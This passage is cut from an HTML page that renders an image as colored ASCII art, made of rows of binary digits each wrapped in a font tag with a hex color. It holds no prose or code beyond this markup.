color=#a67e59>1</font><font color=#9f7f5f>0</font><font color=#573e2d>0</font><font color=#1a0b06>1</font><font color=#080001>1</font><font color=#030101>1</font><font color=#010201>1</font><font color=#010303>0</font><font color=#000101>1</font><font color=#000100>1</font><font color=#010001>0</font><font color=#050c0f>0</font><font color=#112930>0</font><font color=#060d0f>1</font><font color=black>11110</font><br><font color=black>100</font><font color=#000001>0</font><font color=#091519>1</font><font color=#1c434d>0</font><font color=#09161a>1</font><font color=#010101>0</font><font color=#000001>1</font><font color=#010101>0</font><font color=#020203>0</font><font color=#010204>1</font><font color=#010203>0</font><font color=#030406>0</font><font color=#040203>1</font><font color=#0a0503>1</font><font color=#1f1510>0</font><font color=#504136>1</font><font color=#917e69>0</font><font color=#cbb89b>1</font><font color=#e9dec2>1</font><font color=#e9dcc2>1</font><font color=#c3b6a0>1</font><font color=#887763>1</font><font color=#4c3a2c>0</font><font color=#20100b>1</font><font color=#110502>0</font><font color=#07040b>0</font><font color=#01030c>1</font><font color=#02020a>0</font><font color=#010109>0</font><font color=#020108>0</font><font color=#030308>0</font><font color=#040206>1</font><font color=#060308>0</font><font color=#070308>1</font><font color=#0e0404>0</font><font color=#0f0504>0</font><font color=#100704>1</font><font color=#110906>1</font><font color=#120906>0</font><font color=#0e0a07>0</font><font color=#0d0a06>1</font><font color=#0b0805>0</font><font color=#090704>1</font><font color=#060608>0</font><font color=#050406>1</font><font color=#030204>1</font><font color=#030103>0</font><font color=#020102>0</font><font color=#020101>1</font><font color=#020202>0</font><font color=#030100>0</font><font color=#040102>1</font><font color=#050304>0</font><font color=#0a0101>0</font><font color=#1f0e07>0</font><font color=#a8937c>0</font><font color=#fdfaeb>1</font><font color=#f7f0e3>1</font><font color=#cabead>1</font><font color=#d9c5a9>0</font><font color=#efe2ca>0</font><font color=#f7f6f0>1</font><font color=#fdfae6>1</font><font color=#f3e7c6>1</font><font color=#b69a78>1</font><font color=#c3a884>1</font><font color=#f3e8cc>1</font><font color=#b5a794>1</font><font color=#423129>0</font><font color=#0a0404>0</font><font color=#010105>0</font><font color=#010104>1</font><font color=#010206>1</font><font color=#010105>1</font><font color=#000104>0</font><font color=#010104>110</font><font color=#0f0103>0</font><font color=#1b0604>0</font><font color=#42271a>0</font><font color=#a08163>1</font><font color=#c2a784>1</font><font color=#745e46>1</font><font color=#20120d>1</font><font color=#080201>0</font><font color=#040302>1</font><font color=#010101>0</font><font color=black>01</font><font color=#000001>1</font><font color=#020405>1</font><font color=#10272e>0</font><font color=#081316>0</font><font color=#000101>1</font><font color=#000001>1</font><font color=black>01</font><br><font color=black>10</font><font color=#000001>0</font><font color=#091519>0</font><font color=#1c424f>1</font><font color=#081417>0</font><font color=#000001>1</font><font color=#000100>0</font><font color=black>1</font><font color=#010103>0</font><font color=#020106>1</font><font color=#030102>0</font><font color=#090201>1</font><font color=#1e110c>1</font><font color=#5b4a3d>1</font><font color=#a29581>1</font><font color=#e1d7c1>0</font><font color=#faf3e0>1</font><font color=#eae2cc>1</font><font color=#b6a992>1</font><font color=#716051>1</font><font color=#33261d>1</font><font color=#0e0804>1</font><font color=#060402>0</font><font color=#050502>1</font><font color=#030204>1</font><font color=#020306>1</font><font color=#050306>1</font><font color=#0e0805>0</font><font color=#1a130b>0</font><font color=#2c2015>0</font><font color=#3e2b1c>1</font><font color=#52331a>0</font><font color=#653b1c>1</font><font color=#76451e>1</font><font color=#865125>0</font><font color=#905d39>1</font><font color=#956643>1</font><font color=#9d724c>1</font><font color=#a27d57>1</font><font color=#a4855f>0</font><font color=#a98e6a>0</font><font color=#af9876>1</font><font color=#b19d7c>1</font><font color=#ae9d7e>1</font><font color=#ac967b>0</font><font color=#a18a70>1</font><font color=#8d7762>0</font><font color=#715c4c>1</font><font color=#544337>0</font><font color=#342721>0</font><font color=#19120d>0</font><font color=#0c0503>1</font><font color=#060103>0</font><font color=#040306>1</font><font color=#090101>0</font><font color=#1d0905>0</font><font color=#89715b>0</font><font color=#e8e1d0>0</font><font color=#f8f3e5>1</font><font color=#e3d8c5>1</font><font color=#b08c68>0</font><font color=#835233>1</font><font color=#795441>1</font><font color=#9d806b>1</font><font color=#c3b6a4>0</font><font color=#e5e2d6>1</font><font color=#fafbf5>1</font><font color=#fcfbf3>1</font><font color=#fef9eb>0</font><font color=#e3c4aa>0</font><font color=#4d3224>0</font><font color=#020101>1</font><font color=#030101>010</font><font color=#020101>0</font><font color=#030101>1</font><font color=#030001>1</font><font color=#040102>0</font><font color=#03020f>1</font><font color=#030212>1</font><font color=#060104>0</font><font color=#130403>1</font><font color=#5d402b>1</font><font color=#d6bd98>1</font><font color=#cbb397>0</font><font color=#614436>0</font><font color=#1c0705>0</font><font color=#040000>1</font><font color=#000100>1</font><font color=#010101>11</font><font color=#010001>0</font><font color=#020405>0</font><font color=#10272e>0</font><font color=#071316>0</font><font color=#000001>1</font><font color=black>00</font><br><font color=#000001>01</font><font color=#060c0e>1</font><font color=#1d4451>0</font><font color=#0a191e>1</font><font color=#010001>0</font><font color=black>0</font><font color=#000001>00</font><font color=#050101>0</font><font color=#0b0001>0</font><font color=#1b110c>0</font><font color=#6c5f54>0</font><font color=#cabdab>1</font><font color=#f7efdc>1</font><font color=#faf3dd>0</font><font color=#d5c5ad>1</font><font color=#846b58>1</font><font color=#372a22>0</font><font color=#0d0a07>0</font><font color=#050101>1</font><font color=#060201>1</font><font color=#050201>1</font><font color=#040201>1</font><font color=#050302>0</font><font color=#11100e>1</font><font color=#21201d>0</font><font color=#3e291b>1</font><font color=#462913>0</font><font color=#412a14>1</font><font color=#3a2614>0</font><font color=#322015>0</font><font color=#281a10>1</font><font color=#21140c>1</font><font color=#1c1009>1</font><font color=#180e08>0</font><font color=#130c08>1</font><font color=#110a08>1</font><font color=#120a06>1</font><font color=#140b07>0</font><font color=#170c08>0</font><font color=#1d110b>0</font><font color=#241710>0</font><font color=#2f2018>1</font><font color=#3d2e22>0</font><font color=#574535>1</font><font color=#786553>0</font><font color=#a5947e>0</font><font color=#d6c6b0>1</font><font color=#eee2cb>0</font><font color=#ebe4cd>1</font><font color=#d7ccb5>1</font><font color=#b2a28e>0</font><font color=#7d6a59>1</font><font color=#432f28>1</font><font color=#190a07>1</font><font color=#0c0101>1</font><font color=#120907>1</font><font color=#342922>1</font><font color=#544539>1</font><font color=#624e3d>1</font><font color=#674a30>0</font><font color=#5a371d>1</font><font color=#472412>0</font><font color=#45281d>0</font><font color=#6c5546>0</font><font color=#b9a995>1</font><font color=#faf6e8>0</font><font color=#fefbf0>1</font><font color=#fefaee>0</font><font color=#faf3e6>1</font><font color=#ac998d>0</font><font color=#4a352b>0</font><font color=#180b05>0</font><font color=#080101>1</font><font color=#040201>1</font><font color=#020202>0</font><font color=#010203>0</font><font color=#020005>0</font><font color=#020107>0</font><font color=#080106>1</font><font color=#080104>1</font><font color=#040102>0</font><font color=#040001>0</font><font color=#0a0301>1</font><font color=#675039>0</font><font color=#f3e5c7>1</font><font color=#eedcc4>0</font><font color=#906c5c>1</font><font color=#140b08>0</font><font color=#040100>1</font><font color=#030202>1</font><font color=#010203>1</font><font color=#010104>1</font><font color=#000104>1</font><font color=#030608>1</font><font color=#122a31>1</font><font color=#050b0d>1</font><font color=black>01</font><br><font color=black>1</font><font color=#020506>1</font><font color=#1b404c>0</font><font color=#10262c>1</font><font color=#010103>0</font><font color=#010101>01</font><font color=#040000>1</font><font color=#050000>1</font><font color=#120604>0</font><font color=#594233>0</font><font color=#cdbfa9>1</font><font color=#f9f3e0>0</font><font color=#f5efdf>0</font><font color=#bbb1a2>0</font><font color=#5a4e42>0</font><font color=#1a100c>1</font><font color=#0c0201>1</font><font color=#070101>1</font><font color=#040202>0</font><font color=#020102>01</font><font color=#030200>0</font><font color=#040201>1</font><font color=#030201>0</font><font color=#030303>0</font><font color=#040302>0</font><font color=#040202>0</font><font color=#050202>0</font><font color=#050102>0</font><font color=#040204>1</font><font color=#020105>1</font><font color=#010105>1</font><font color=#020107>1</font><font color=#010207>1</font><font color=#010107>1</font><font color=#010304>010</font><font color=#010204>1</font><font color=#010004>0</font><font color=#010003>1</font><font color=#020003>1</font><font color=#030103>1</font><font color=#040104>1</font><font color=#060001>0</font><font color=#090101>1</font><font color=#0b0402>1</font><font color=#190e0a>1</font><font color=#362820>0</font><font color=#6c5c4d>1</font><font color=#a49583>1</font><font color=#d4c7b1>0</font><font color=#eee7cf>0</font><font color=#f0e8d1>1</font><font color=#cdbfab>0</font><font color=#867666>1</font><font color=#4d3d32>0</font><font color=#291812>1</font><font color=#240e08>0</font><font color=#5b3a29>0</font><font color=#a57e60>1</font><font color=#d1b598>1</font><font color=#e3d5c3>0</font><font color=#f2e9d8>0</font><font color=#faf5ea>1</font><font color=#fcfbf5>0</font><font color=#fdfdf9>0</font><font color=#fdfcfc>0</font><font color=#fcfcfc>0</font><font color=#f8f6f7>0</font><font color=#e3d6c5>1</font><font color=#dabf98>0</font><font color=#ceb693>0</font><font color=#a0886a>0</font><font color=#65513d>1</font><font color=#3b2b1e>0</font><font color=#23160e>1</font><font color=#150c08>0</font><font color=#110704>1</font><font color=#0c0404>1</font><font color=#070303>0</font><font color=#020201>0</font><font color=#010201>0</font><font color=#020201>0</font><font color=#493d2a>1</font><font color=#e2d8bd>1</font><font color=#fdf9e0>1</font><font color=#f6ecd9>1</font><font color=#86705f>1</font><font color=#190b06>1</font><font color=#090101>0</font><font color=#070100>0</font><font color=#020101>1</font><font color=#010102>1</font><font color=#010101>1</font><font color=#03090b>1</font><font color=#132e37>1</font><font color=#020405>0</font><font color=black>0</font><br><font color=black>1</font><font color=#10262d>1</font><font color=#1a404b>0</font><font color=#020508>1</font><font color=#010105>0</font><font color=#010204>1</font><font color=#050101>1</font><font color=#0b0200>1</font><font color=#1e0f0a>0</font><font color=#8b7460>0</font><font color=#f0e4ca>1</font><font color=#f8f2dd>0</font><font color=#c0b3a0>1</font><font color=#594b41>0</font><font color=#110a07>1</font><font color=#040101>1</font><font color=#020202>1</font><font color=#020304>0</font><font color=#010103>1</font><font color=#000002>0</font><font color=#000001>01</font><font color=black>0010</font><font color=#000100>0</font><font color=#010101>0</font><font color=#010102>001</font><font color=#010202>0</font><font color=#010102>0</font><font color=#010103>0</font><font color=#010101>10</font><font color=#020101>01</font><font color=#020100>1</font><font color=#010100>0</font><font color=#010001>0</font><font color=#010002>0</font><font color=#000002>0</font><font color=#000003>1</font><font color=#010004>10</font><font color=#000103>1</font><font color=#010101>0</font><font color=#030000>1</font><font color=#060101>0</font><font color=#080001>1</font><font color=#0c0201>1</font><font color=#150c08>1</font><font color=#372921>1</font><font color=#6c5843>0</font><font color=#9b8b72>1</font><font color=#c3b69a>0</font><font color=#d9cbae>0</font><font color=#d7c5a5>1</font><font color=#c6ae8f>0</font><font color=#af9374>0</font><font color=#a48161>0</font><font color=#b58e66>0</font><font color=#caa576>0</font><font color=#d4b78d>0</font><font color=#dec6a1>1</font><font color=#e5d1b2>1</font><font color=#e9d4b9>1</font><font color=#d9c9b3>1</font><font color=#b2a08c>0</font><font color=#715d53>0</font><font color=#301f18>1</font><font color=#1f1008>1</font><font color=#3e2c1f>1</font><font color=#624d3b>0</font><font color=#856e58>1</font><font color=#957a5f>0</font><font color=#967355>0</font><font color=#845e3f>1</font><font color=#6d4728>0</font><font color=#4f3929>1</font><font color=#28211b>1</font><font color=#0a0704>0</font><font color=#030202>1</font><font color=#070101>0</font><font color=#1a100b>0</font><font color=#483a2e>0</font><font color=#8a7966>1</font><font color=#c8bfac>0</font><font color=#e9d8bb>1</font><font color=#b39a7f>1</font><font color=#533b2d>1</font><font color=#160604>0</font><font color=#080101>0</font><font color=#020001>1</font><font color=#010101>0</font><font color=#010103>0</font><font color=#0b191f>1</font><font color=#0c1e23>0</font><font color=black>0</font><br><font color=#030809>1</font><font color=#1d4652>0</font><font color=#0c1b20>0</font><font color=#010103>0</font><font color=#000105>1</font><font color=#020204>0</font><font color=#070101>1</font><font color=#170905>1</font><font color=#957963>0</font><font color=#f6ebd3>0</font><font color=#e3d6c2>1</font><font color=#746252>0</font><font color=#1e110d>0</font><font color=#0a0201>0</font><font color=#060101>0</font><font color=#030201>0</font><font color=#010203>1</font><font color=#010306>0</font><font color=#010105>0</font><font color=#010004>0</font><font color=#010103>1</font><font color=#000102>0</font><font color=#000002>1</font><font color=#020101>00</font><font color=#020001>1</font><font color=#010101>1</font><font color=#020102>1</font><font color=#040003>001</font><font color=#040103>1</font><font color=#040004>1</font><font color=#030104>10</font><font color=#020005>1</font><font color=#020003>01</font><font color=#030002>10</font><font color=#020001>0</font><font color=#010000>00</font><font color=#020101>00</font><font color=#010103>1</font><font color=#000004>1</font><font color=#000003>0</font><font color=#010004>1</font><font color=#020104>1</font><font color=#010103>0</font><font color=#020205>1</font><font color=#020104>1</font><font color=#030104>0</font><font color=#070108>1</font><font color=#080206>0</font><font color=#100807>1</font><font color=#211611>0</font><font color=#362920>1</font><font color=#4e3e31>1</font><font color=#5e5041>0</font><font color=#6e604d>0</font><font color=#75644e>1</font><font color=#7b6247>1</font><font color=#6f5d46>0</font><font color=#62523e>1</font><font color=#4c3e2f>1</font><font color=#322820>1</font><font color=#1c1211>0</font><font color=#0f0607>0</font><font color=#0c0005>0</font><font color=#070306>0</font><font color=#010407>0</font><font color=#020106>1</font><font color=#040106>0</font><font color=#070006>0</font><font color=#080105>0</font><font color=#090206>1</font><font color=#0a0406>0</font><font color=#090406>0</font><font color=#090104>1</font><font color=#050002>0</font><font color=#020105>1</font><font color=#020209>1</font><font color=#030107>0</font><font color=#060103>0</font><font color=#090101>0</font><font color=#0a0201>1</font><font color=#150f0c>0</font><font color=#62402e>1</font><font color=#b89673>1</font><font color=#e2cdaf>0</font><font color=#88715e>1</font><font color=#180f0b>0</font><font color=#050101>1</font><font color=#010101>1</font><font color=#010103>1</font><font color=#020408>0</font><font color=#122b33>0</font><font color=#030607>1</font><br><font color=#0d1f24>0</font><font color=#1c424d>1</font><font color=#040608>1</font><font color=#010104>0</font><font color=#01030a>1</font><font color=#040103>1</font><font color=#180300>1</font><font color=#6e4833>0</font><font color=#ecdac1>1</font><font color=#b7a594>0</font><font color=#3d291f>0</font><font color=#0d0202>1</font><font color=#050101>0</font><font color=#020104>1</font><font color=#010206>1</font><font color=#020204>0</font><font color=#040101>0</font><font color=#0a0101>0</font><font color=#0d0305>1</font><font color=#10070b>1</font><font color=#180f0e>1</font><font color=#261c16>1</font><font color=#3c2e24>1</font><font color=#554337>0</font><font color=#6a5447>0</font><font color=#806757>0</font><font color=#8e7562>0</font><font color=#a08473>0</font><font color=#a98d7c>1</font><font color=#b19583>1</font><font color=#b69a86>0</font><font color=#b69b87>00</font><font color=#b39884>0</font><font color=#ae9280>1</font><font color=#a98c7c>1</font><font color=#988174>0</font><font color=#8b776b>0</font><font color=#7d6a5f>0</font><font color=#6c5951>1</font><font color=#5b4b45>1</font><font color=#4a3c36>1</font><font color=#382a26>0</font><font color=#2a1d1a>1</font><font color=#211411>0</font><font color=#100b0a>1</font><font color=#080607>1</font><font color=#070404>0</font><font color=#050203>0</font><font color=#040203>0</font><font color=#040104>1</font><font color=#040105>0</font><font color=#020105>0</font><font color=#040103>0</font><font color=#080005>1</font><font color=#050104>1</font><font color=#020105>1</font><font color=#020107>0</font><font color=#020309>0</font><font color=#03030a>0</font><font color=#06030a>1</font><font color=#0a030a>0</font><font color=#0b0308>1</font><font color=#0b0407>1</font><font color=#0c0508>1</font><font color=#0c0608>1</font><font color=#0f0709>1</font><font color=#110a0b>1</font><font color=#130a0a>1</font><font color=#150d0a>1</font><font color=#180d0a>0</font><font color=#170e10>1</font><font color=#120d13>1</font><font color=#100a0f>1</font><font color=#0f070b>0</font><font color=#0e0506>0</font><font color=#0b0403>0</font><font color=#0a0203>1</font><font color=#070202>1</font><font color=#060302>1</font><font color=#030209>0</font><font color=#02010c>0</font><font color=#060205>1</font><font color=#120606>0</font><font color=#2a1813>0</font><font color=#432f25>1</font><font color=#443329>0</font><font color=#291e18>1</font><font color=#0e0604>1</font><font color=#050301>0</font><font color=#0e0704>0</font><font color=#51382a>0</font><font color=#c49f80>1</font><font color=#8a6347>0</font><font color=#180503>1</font><font color=#0a0000>1</font><font color=#020203>0</font><font color=#000209>0</font><font color=#0c1d23>0</font><font color=#091418>1</font><br><font color=#1b414c>1</font><font color=#11272e>0</font><font color=#020103>1</font><font color=#000101>0</font><font color=#010104>0</font><font color=#080101>0</font><font color=#34130a>1</font><font color=#c39570>0</font><font color=#a07e60>1</font><font color=#1f130d>1</font><font color=#050303>1</font><font color=#020202>01</font><font color=#020101>1</font><font color=#050201>1</font><font color=#0e0605>1</font><font color=#2c1e18>1</font><font color=#5e4c40>1</font><font color=#96806d>1</font><font color=#c5ad96>0</font><font color=#dfd0b9>1</font><font color=#f0e4d2>1</font><font color=#f9f1e3>1</font><font color=#fcf7ed>1</font><font color=#fdfcf4>1</font><font color=#fbfefa>1</font><font color=#fafefc>0</font><font color=#fcfdf6>1</font><font color=#fdfdf2>1</font><font color=#fdfcf1>1</font><font color=#fcfbf0>0</font><font color=#fbfaf0>1</font><font color=#fbfaef>0</font><font color=#fcfaef>1</font><font color=#fbfaef>1</font><font color=#faf9ef>0</font><font color=#fbf8e7>1</font><font color=#fcf8e6>0</font><font color=#fcf7e7>00</font><font color=#fcf6e5>1</font><font color=#f9f3e3>0</font><font color=#f6eedd>1</font><font color=#ede7d6>1</font><font color=#e1dbca>1</font><font color=#d1c7ae>0</font><font color=#bab097>1</font><font color=#a2957f>1</font><font color=#887a66>1</font><font color=#6d5e4d>1</font><font color=#504134>1</font><font color=#392920>1</font><font color=#251710>1</font><font color=#170a08>1</font><font color=#05040b>1</font><font color=#020208>1</font><font color=#040205>1</font><font color=#070002>1</font><font color=#180c06>1</font><font color=#322014>0</font><font color=#492d1e>0</font><font color=#66422a>1</font><font color=#836047>0</font><font color=#998168>0</font><font color=#ad9780>0</font><font color=#bda890>1</font><font color=#cab99f>0</font><font color=#d3c4a9>1</font><font color=#d7c8b0>1</font><font color=#dbceb6>1</font><font color=#ddd1b9>1</font><font color=#dcd2b9>0</font><font color=#d7cfb3>1</font><font color=#d4c9ae>0</font><font color=#cabea4>0</font><font color=#bbad97>0</font><font color=#8e7a6c>0</font><font color=#2b1c17>1</font><font color=#0a0000>0</font><font color=#0b0202>0</font><font color=#050202>1</font><font color=#060401>0</font><font color=#160e08>0</font><font color=#63523d>1</font><font color=#a9957c>0</font><font color=#baa992>1</font><font color=#aa9780>1</font><font color=#6b5443>0</font><font color=#230e09>0</font><font color=#040104>0</font><font color=#060202>1</font><font color=#100101>0</font><font color=#321a11>1</font><font color=#82644c>1</font><font color=#1e120d>0</font><font color=#060000>1</font><font color=#010202>1</font><font color=#010205>1</font><font color=#050d10>1</font><font color=#0e2127>1</font><br><font color=#214e5c>0</font><font color=#09171c>0</font><font color=#000001>011</font><font color=#070101>0</font><font color=#56321d>1</font><font color=#8e6342>1</font><font color=#250c07>1</font><font color=#070303>0</font><font color=#020307>1</font><font color=#030202>1</font><font color=#060201>0</font><font color=#100907>0</font><font color=#52443c>1</font><font color=#a89c8f>0</font><font color=#e1d8ca>0</font><font color=#f8f2e4>1</font><font color=#fbfcf3>1</font><font color=#fafdfb>1</font><font color=#fcfdfa>1</font><font color=#fbf8f3>0</font><font color=#f0eae0>0</font><font color=#ded1c4>1</font><font color=#c9b8a7>1</font><font color=#b49f8e>1</font><font color=#a38d7c>1</font><font color=#8d7968>1</font><font color=#7e6d58>0</font><font color=#75624e>1</font><font color=#6e5b48>1</font><font color=#695543>0</font><font color=#675443>0</font><font color=#655442>1</font><font color=#655341>1</font><font color=#64533f>1</font><font color=#5c5044>0</font><font color=#5b5144>1</font><font color=#5c5145>0</font><font color=#605347>0</font><font color=#655648>1</font><font color=#6a5a4c>1</font><font color=#726251>0</font><font color=#7e6e5c>0</font><font color=#8a7967>1</font><font color=#9b8971>1</font><font color=#a9967e>0</font><font color=#baaa90>1</font><font color=#c8bba0>0</font><font color=#d4c6ac>0</font><font color=#ded1b9>0</font><font color=#ded1ba>1</font><font color=#d6c9b3>1</font><font color=#c5b79f>1</font><font color=#aa967c>1</font><font color=#897359>0</font><font color=#634a37>0</font><font color=#422a1c>1</font><font color=#26120a>1</font><font color=#180a05>1</font><font color=#140906>1</font><font color=#18100a>0</font><font color=#231912>1</font><font color=#39271e>0</font><font color=#4a392f>0</font><font color=#615244>1</font><font color=#7c6e5e>0</font><font color=#9b8e7d>1</font><font color=#b8ab9b>0</font><font color=#d2c7b7>0</font><font color=#e7e0cc>0</font><font color=#f4eee4>0</font><font color=#fcf7f6>0</font><font color=#fefaf6>0</font><font color=#fef9f1>1</font><font color=#fdf9ec>1</font><font color=#c3b3a3>1</font><font color=#32261c>0</font><font color=#0e0704>0</font><font color=#0b0603>1</font><font color=#0b0806>1</font><font color=#0d0a06>1</font><font color=#070302>0</font><font color=#0a0504>1</font><font color=#0d0704>11</font><font color=#090402>0</font><font color=#050101>1</font><font color=#050003>0</font><font color=#020106>0</font><font color=#010102>0</font><font color=#080001>0</font><font color=#0c0201>0</font><font color=#1c130d>0</font><font color=#090605>1</font><font color=#030100>0</font><font color=#020102>0</font><font color=#040101>1</font><font color=#020506>1</font><font color=#0d1f24>1</font><br><font color=#214f5c>0</font><font color=#081318>1</font><font color=#010001>110</font><font color=#040201>0</font><font color=#462d1d>1</font><font color=#2d170e>0</font><font color=#080204>1</font><font color=#020206>0</font><font color=#080201>1</font><font color=#0c0201>0</font><font color=#392821>0</font><font color=#ad9b88>1</font><font color=#f3ecda>0</font><font color=#fef9ed>0</font><font color=#fefcf5>0</font><font color=#f8f9f7>0</font><font color=#eae3d5>1</font><font color=#c7b097>0</font><font color=#897261>0</font><font color=#574237>1</font><font color=#311e19>1</font><font color=#1d0e0b>1</font><font color=#130906>1</font><font color=#100507>0</font><font color=#110609>0</font><font color=#080304>0</font><font color=#040203>11</font><font color=#030103>1</font><font color=#040203>0</font><font color=#050203>0</font><font color=#070304>1</font><font color=#090504>0</font><font color=#0a0704>1</font><font color=#0d0907>0</font><font color=#110a08>0</font><font color=#150f0b>1</font><font color=#1b120e>1</font><font color=#20140f>1</font><font color=#241611>0</font><font color=#281712>0</font><font color=#2d1a14>1</font><font color=#301c16>0</font><font color=#381e19>0</font><font color=#391f19>1</font><font color=#381f1b>0</font><font color=#39211a>0</font><font color=#3a221a>1</font><font color=#3f271b>0</font><font color=#432b20>1</font><font color=#4e3529>1</font><font color=#5a4435>1</font><font color=#6a5542>1</font><font color=#806852>1</font><font color=#957c5f>1</font><font color=#a98969>1</font><font color=#b18864>0</font><font color=#aa7b51>1</font><font color=#8a5c37>1</font><font color=#663c1b>1</font><font color=#432312>1</font><font color=#1b1111>1</font><font color=#110606>0</font><font color=#0b0202>0</font><font color=#0d0201>0</font><font color=#0d0202>0</font><font color=#110503>1</font><font color=#1d110d>0</font><font color=#31241d>0</font><font color=#443328>0</font><font color=#604c3d>0</font><font color=#846e5c>0</font><font color=#ae9c82>0</font><font color=#d5c7aa>1</font><font color=#ece0c5>1</font><font color=#e7dac1>0</font><font color=#d2c7b2>1</font><font color=#ccc0af>1</font><font color=#d3c5b3>1</font><font color=#d1c3b2>0</font><font color=#9b8679>1</font><font color=#36231d>1</font><font color=#0b0101>0</font><font color=#070000>0</font><font color=#030100>1</font><font color=#020101>1</font><font color=#010102>1</font><font color=#010407>0</font><font color=#000204>1</font><font color=#010101>1</font><font color=#020101>0</font><font color=#020205>1</font><font color=#010206>0</font><font color=#010104>0</font><font color=#020101>1</font><font color=#080100>1</font><font color=#030404>0</font><font color=#0c1d22>0</font><br><font color=#214f5d>0</font><font color=#09161a>0</font><font color=black>110</font><font color=#010101>0</font><font color=#060302>0</font><font color=#020101>0</font><font color=#010102>1</font><font color=#050101>1</font><font color=#0f0001>0</font><font color=#442c25>1</font><font color=#ccbaaa>1</font><font color=#fcfaf0>0</font><font color=#fefcef>1</font><font color=#fbf8e1>1</font><font color=#dccdb5>0</font><font color=#867261>1</font><font color=#2f271f>1</font><font color=#0d0703>1</font><font color=#050301>1</font><font color=#040303>1</font><font color=#040206>0</font><font color=#030205>1</font><font color=#050303>0</font><font color=#0a0202>0</font><font color=#150708>1</font><font color=#20120e>0</font><font color=#33241d>1</font><font color=#4a3a30>0</font><font color=#635145>0</font><font color=#7b6959>1</font><font color=#927d6b>1</font><font color=#a99179>1</font><font color=#baa387>1</font><font color=#c6af91>1</font><font color=#cbbfa8>1</font><font color=#d0c7b3>0</font><font color=#d9d1bd>0</font><font color=#e0d8c5>0</font><font color=#e3dccb>1</font><font color=#e8dece>1</font><font color=#eadfd1>1</font><font color=#ece2d5>1</font><font color=#eee2d6>1</font><font color=#ede6db>0</font><font color=#ede4da>0</font><font color=#ece1d5>1</font><font color=#e9dfcf>0</font><font color=#e6dac7>0</font><font color=#e1d4be>1</font><font color=#dbceb4>0</font><font color=#d3c5aa>0</font><font color=#cbba9d>0</font><font color=#bfa989>1</font><font color=#b0997b>1</font><font color=#9f8569>1</font><font color=#8d735b>0</font><font color=#7d6048>1</font><font color=#6c4f38>0</font><font color=#60432c>0</font><font color=#5b3d27>1</font><font color=#5c3c29>0</font><font color=#623623>0</font><font color=#4e301d>1</font><font color=#311d12>1</font><font color=#110805>0</font><font color=#040101>1</font><font color=#070101>0</font><font color=#130a07>0</font><font color=#33271f>0</font><font color=#603d28>1</font><font color=#8b5a38>0</font><font color=#a37953>1</font><font color=#9f7f5b>1</font><font color=#90714e>0</font><font color=#876646>0</font><font color=#95704b>0</font><font color=#af8d6b>0</font><font color=#d4b999>1</font><font color=#efdfd3>0</font><font color=#fcf2ee>0</font><font color=#f2e1d3>1</font><font color=#8d6c57>1</font><font color=#28150f>1</font><font color=#100504>0</font><font color=#030201>1</font><font color=#020301>0</font><font color=#020404>0</font><font color=#010203>0</font><font color=#010102>0</font><font color=#010001>1</font><font color=#050001>0</font><font color=#060001>1</font><font color=#060101>1</font><font color=#030102>1</font><font color=#010101>1</font><font color=#020102>1</font><font color=#020505>1</font><font color=#0d1f24>1</font><br><font color=#1d444f>1</font><font color=#0f242a>0</font><font color=#010102>0</font><font color=black>000100</font><font color=#040000>0</font><font color=#150703>0</font><font color=#a08471>0</font><font color=#fcf6e2>1</font><font color=#fefef1>0</font><font color=#f5f2e7>0</font><font color=#a5957f>0</font><font color=#392319>0</font><font color=#100201>1</font><font color=#040206>0</font><font color=#020209>0</font><font color=#040102>0</font><font color=#0a0101>0</font><font color=#110302>1</font><font color=#281710>1</font><font color=#514335>1</font><font color=#867b6c>0</font><font color=#b4aa9c>0</font><font color=#d5cbbe>1</font><font color=#eae4d7>0</font><font color=#f5f1e3>0</font><font color=#fcf6eb>0</font><font color=#fdfbf1>1</font><font color=#fefcf2>0</font><font color=#fefcf4>0</font><font color=#f8f5ef>0</font><font color=#ebe9e2>0</font><font color=#e0d5b9>0</font><font color=#cfc2a4>0</font><font color=#bcaf93>1</font><font color=#aa9b84>0</font><font color=#998a77>1</font><font color=#8a7c6b>0</font><font color=#7d6f61>0</font><font color=#716558>1</font><font color=#695c51>0</font><font color=#605448>0</font><font color=#5d5144>0</font><font color=#5b4c3f>1</font><font color=#5a493d>1</font><font color=#5c483a>0</font><font color=#5e483a>1</font><font color=#5f4739>1</font><font color=#61493a>1</font><font color=#654c3b>1</font><font color=#68503c>0</font><font color=#6e5742>1</font><font color=#755e48>0</font><font color=#7e664f>0</font><font color=#866d56>0</font><font color=#8d7358>1</font><font color=#957b5c>1</font><font color=#97795c>1</font><font color=#997659>1</font><font color=#936d56>1</font><font color=#856246>1</font><font color=#765136>1</font><font color=#634127>1</font><font color=#50331e>1</font><font color=#3b2315>0</font><font color=#24130c>0</font><font color=#110704>1</font><font color=#0e0101>1</font><font color=#150302>1</font><font color=#23110c>0</font><font color=#443428>1</font><font color=#7b6d58>1</font><font color=#b8a78b>0</font><font color=#ddcaab>0</font><font color=#d6bea2>0</font><font color=#b99479>0</font><font color=#9d7151>0</font><font color=#9e7958>1</font><font color=#c3a581>1</font><font color=#e2d2af>0</font><font color=#dad0b5>0</font><font color=#afa896>1</font><font color=#655e53>0</font><font color=#251a14>1</font><font color=#130201>0</font><font color=#050101>0</font><font color=#010101>0</font><font color=#000001>1</font><font color=#010004>0</font><font color=#010106>1</font><font color=#020105>1</font><font color=#000003>0</font><font color=#010101>1</font><font color=#010100>1</font><font color=#050c0d>0</font><font color=#0d1f25>1</font><br><font color=#0c1c21>0</font><font color=#1a3e49>0</font><font color=#030606>0</font><font color=black>010111</font><font color=#010000>1</font><font color=#1f110b>1</font><font color=#c8ad90>0</font><font color=#fefbde>0</font><font color=#fcfae7>1</font><font color=#9d9585>1</font><font color=#23140e>0</font><font color=#100101>0</font><font color=#060104>0</font><font color=#030106>0</font><font color=#070104>0</font><font color=#100706>1</font><font color=#44342d>1</font><font color=#a59081>0</font><font color=#e1d4c0>0</font><font color=#f8f3e1>0</font><font color=#fcfbec>1</font><font color=#fdfef2>0</font><font color=#fefcf4>0</font><font color=#fefbf4>1</font><font color=#fcf9f2>0</font><font color=#efe8dd>0</font><font color=#ccc2b3>1</font><font color=#9e8d7d>1</font><font color=#715a4d>0</font><font color=#4d362c>0</font><font color=#381e18>0</font><font color=#19100d>1</font><font color=#110a08>1</font><font color=#0c0504>0</font><font color=#0a0302>0</font><font color=#0a0202>0</font><font color=#0a0201>0</font><font color=#090101>10</font><font color=#0a0302>1</font><font color=#110806>1</font><font color=#1a110c>0</font><font color=#291d16>0</font><font color=#3b2c22>0</font><font color=#4e3c30>0</font><font color=#5d4a3c>0</font><font color=#6c594a>0</font><font color=#796555>1</font><font color=#806d5c>0</font><font 